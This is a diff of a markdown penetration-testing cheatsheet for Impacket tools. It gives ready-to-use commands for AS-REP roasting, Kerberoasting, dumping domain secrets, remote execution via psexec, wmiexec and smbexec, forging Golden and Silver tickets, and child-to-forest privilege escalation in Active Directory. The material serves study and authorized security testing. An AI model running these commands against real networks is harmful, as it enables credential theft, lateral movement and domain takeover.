@@ -17,6 +17,11 @@ From [Impacket Github](https://github.com/SecureAuthCorp/impacket) or [secureAut
 
 Impacket is an awesome suite of scripts written in python that are incorpated into tools like [[Crackmapexec-Cheatsheet]]. It is very useful suite of tools for [[Active-Directory-Enumeration-Defined]], [[Active-Directory-Footholding]], [[Attacking-Kerberos]], [[Active-Directory-Lateral-Movement]] and general [[Active-Directory-Privilege-Escalation]].
 
+Working with ccache files on Linux:
+```bash
+export KRB5CCNAME=Administrator.ccache
+```
+
 Haak9 Technical tips
 ```bash
 # All the Impacket scripts support Kerberos authentication as well:
@@ -40,14 +45,18 @@ kinit user
 ```
 
 ## dcomexec.py 
+
 Useful for [[Active-Directory-Lateral-Movement]].  A semi-interactive shell similar to wmiexec.py, but using different DCOM endpoints. Currently supports MMC20.Application, ShellWindows and ShellBrowserWindow objects.
 ```bash
 dcomexec.py $domain/$username:$password@$IP <command>
 ```
+
 ## dpapi.py
+
 Password Encryption tool on Windows
 
 ## GetNPUsers.py
+
 ASREP Roasting - For users that do not require Kerberos preauthentiation: 'Do not require Kerberos preauthentication' set (UF_DONT_REQUIRE_PREAUTH). Output is compatible with JtR:[[John-The-Ripper-Cheatsheet]] use `-format hashcat` for  hashcat: [[Hashcat-Cheatsheet]].
 ```bash
 GetNPUsers.py  -dc-ip $IP -request '$domain/' 
@@ -67,14 +76,15 @@ This example will attempt to list and get TGTs for those users that have the pro
 ```
 
 
-
 ## GetTGT.py
+
 Given a password, hash or aesKey, this script will request a TGT and save it as ccache.
 ```bash
 getTGT.py -hashes lm:nt domain.com/user
 ```
 
 ## GetST.py
+
 Given a password, hash, aesKey or TGT in ccache, this script will request a Service Ticket and save it as ccache. If the account has constrained delegation (with protocol transition) privileges you will be able to use the -impersonate.
 switch to request the ticket on behalf another user.
 ```bash
@@ -82,19 +92,31 @@ getST.py -hashes $lm:$nt -spn $spn/$spn-dc $domain$/$user
 ```
 
 ## GetUserSPNs.py
+
 This example will try to find and fetch Service Principal Names that are associated with normal user accounts. Output is compatible with JtR and HashCat.
 ```bash
 GetUserSPNs.py -dc-ip $ip $domain.local/$user -request # provide a password
 GetUserSPNs.py -dc-ip $dc-ip $spn.info/$notanadmin
 ```
 
+## lookupsid.py
+
+Requires NTLM authentication
+```bash
+lookupsid.py $target
+```
+
 ## mssqlclient.py
 
 ```bash
 mssqlclient.py -port $PORT $domain/$user@$IP -windows-auth
+# Example with kerberos Authenication from a silver ticket with ccache file
+export KRB5CCNAME=Administrator.ccache
+impacket-mssqlclient -no-pass -k $domain.local/Administrator@dc1.$domain.local
 ```
 
 ## psexec.py
+
 Similiar to [[Sysinternals-Psexec]] like functionality example using [RemComSvc](https://github.com/kavika13/RemCom). Runs as nt system - wmiexec.py runs as Administrator.
 ```bash
 psexec.py $domain/$username:$password@$IP <command>
@@ -102,6 +124,7 @@ psexec.py $domain/$username:$password@$IP -hash
 ```
 
 ## raiseChild.py
+
 This script implements a child-domain to forest privilege escalation by (ab)using the concept of Golden Tickets and ExtraSids. [[Attacking-Kerberos]] 
 ```bash
 python raiseChild.py childDomain.net/$adminuser
@@ -149,6 +172,7 @@ secretsdump -just-dc $domain/$user@$DC-ip
 
 
 ## smbexec.py
+
 A similar to `psexec.py` without using [RemComSvc](https://github.com/kavika13/RemCom). Instantiates a local smbserver to then receive the output of commands.
 ```bash
 smbexec.py $domain/$username:$password@$IP <command>
@@ -180,12 +204,14 @@ cd $Share: # cd Share:
 ```
 
 ## ticketer.py
+
 This script will create Golden/Silver tickets from scratch or based on a template (legally requested from the KDC).
 ```bash
 ticketer.py -nthash <krbtgt/service nthash> -domain-sid <your domain SID> -domain <your domain FQDN> baduser
 ```
 
 ## wmiexec.py
+
 A semi-interactive shell, used through Windows Management Instrumentation. It does not require to install any service/agent at the target server. Runs as Administrator. Highly stealthy.
 ```bash
 wmiexec.py $domain/$username:$password@$IP <command>
